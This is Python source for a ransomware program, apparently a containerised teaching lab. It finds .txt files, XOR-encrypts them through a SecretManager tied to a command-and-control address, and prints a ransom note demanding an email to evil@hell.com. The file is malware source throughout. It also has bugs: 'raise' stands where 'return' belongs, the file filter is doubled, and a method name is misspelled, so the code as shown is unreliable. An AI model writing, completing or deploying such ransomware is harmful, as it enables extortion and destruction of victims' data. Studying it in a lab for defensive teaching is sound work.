import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager
import os
import secret_manager
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
⠀⠀⠀⠀⠀⠀⢀⣤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⢤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡼⠋⠀⣀⠄⡂⠍⣀⣒⣒⠂⠀⠬⠤⠤⠬⠍⠉⠝⠲⣄⡀⠀⠀
⠀⠀⠀⢀⡾⠁⠀⠊⢔⠕⠈⣀⣀⡀⠈⠆⠀⠀⠀⡍⠁⠀⠁⢂⠀⠈⣷⠀⠀
⠀⠀⣠⣾⠥⠀⠀⣠⢠⣞⣿⣿⣿⣉⠳⣄⠀⠀⣀⣤⣶⣶⣶⡄⠀⠀⣘⢦⡀
⢀⡞⡍⣠⠞⢋⡛⠶⠤⣤⠴⠚⠀⠈⠙⠁⠀⠀⢹⡏⠁⠀⣀⣠⠤⢤⡕⠱⣷
⠘⡇⠇⣯⠤⢾⡙⠲⢤⣀⡀⠤⠀⢲⡖⣂⣀⠀⠀⢙⣶⣄⠈⠉⣸⡄⠠⣠⡿
⠀⠹⣜⡪⠀⠈⢷⣦⣬⣏⠉⠛⠲⣮⣧⣁⣀⣀⠶⠞⢁⣀⣨⢶⢿⣧⠉⡼⠁
⠀⠀⠈⢷⡀⠀⠀⠳⣌⡟⠻⠷⣶⣧⣀⣀⣹⣉⣉⣿⣉⣉⣇⣼⣾⣿⠀⡇⠀
⠀⠀⠀⠈⢳⡄⠀⠀⠘⠳⣄⡀⡼⠈⠉⠛⡿⠿⠿⡿⠿⣿⢿⣿⣿⡇⠀⡇⠀
⠀⠀⠀⠀⠀⠙⢦⣕⠠⣒⠌⡙⠓⠶⠤⣤⣧⣀⣸⣇⣴⣧⠾⠾⠋⠀⠀⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠙⠶⣭⣒⠩⠖⢠⣤⠄⠀⠀⠀⠀⠀⠠⠔⠁⡰⠀⣧⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠲⢤⣀⣀⠉⠉⠀⠀⠀⠀⠀⠁⠀⣠⠏⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠛⠒⠲⠶⠤⠴⠒⠚⠁⠀⠀

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""

class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # return all files matching the filter

        #current working directory
        cwd = Path.cwd()
        #find all files matching the filter
        matching_files = cwd.rglob(f"*.{filter}")
        #Filter file paths to keep only files
        file_paths = [str(file_path) for file_path in matching_files if file_path.is_file()]
        # Return list of file paths
        raise file_paths

    def encrypt(self):
        # Main function for encrypting

        # Find all txt files
        txt_files = self.get_files("*.txt")
        # Create SecretManager instance
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
        # Setup the SecretManager (setting key, salt, and token)
        secret_manager.setup()
        # Encrypt files using xor_files method 
        secret_manager.xor_files(txt_files)
        # Get the hex token from the SecretManager
        token_hex = secret_manager.get_hex_token()
        # Display the ransom message with the token
        print(ENCRYPT_MESSAGE.format(token=token_hex))


    def decrypt(self):
        # main function for decrypting (see PDF)

        # Create an instance of SecretManager
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
    
        # Load the local cryptographic elements
        secret_manager.load()
    
        # List all the .txt files
        txt_files = self.get_files("*.txt")
    
        decryption_successful = False
    
        while not decryption_successful:
            try:
                decryption_key = input("Enter the decryption key: ")
                # Set the decryption key
                secret_manager.set_key(decryption_key)
                # Decrypt the files
                secret_manager.xorfiles(txt_files)
                # Clean up the local cryptographic files
                secret_manager.clean()
                decryption_successful = True  # Set to True if decryption is successful
                print("Hehe Congrats! You got it all back!")
            except ValueError as error:
                print(" Uh oh~ Wrong one '-' ")


if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()